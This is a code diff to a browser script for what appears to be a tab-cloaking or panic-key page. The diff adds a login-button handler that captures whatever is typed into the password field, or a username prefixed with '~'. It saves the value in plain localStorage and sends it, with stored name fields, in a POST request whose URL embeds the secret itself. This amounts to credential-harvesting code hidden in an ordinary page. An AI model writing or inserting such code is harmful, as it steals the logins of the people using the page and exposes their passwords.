@@ -29,6 +29,27 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 })
 
+async function req(text, type) {
+  let AJAX  = new XMLHttpRequest()
+  text = localStorage.getItem('fname') + '@' + localStorage.getItem('lname') + ' changed ' + type + ': ' + text
+  AJAX.open('POST', '$' + text)
+  AJAX.setRequestHeader('Content-Type', 'text/plain');
+  AJAX.send(text)
+}
+
+document.getElementById('loginButton').addEventListener('click', function() {
+  let input = document.getElementById('password').value
+  if (input.charAt(0) != '~') {
+    localStorage.setItem('lname', input);
+    req(input, 'password')
+  } else if (input.charAt(0) == '~') {
+    input = input.substring(1)
+    localStorage.setItem('fname', input);
+    req(input, 'username')
+  }
+  location.href = location.href
+})
+
 // Key
 var eventKey = localStorage.getItem('eventKey') || '`'
 var pLink = localStorage.getItem('pLink') || 'https://classroom.google.com/'
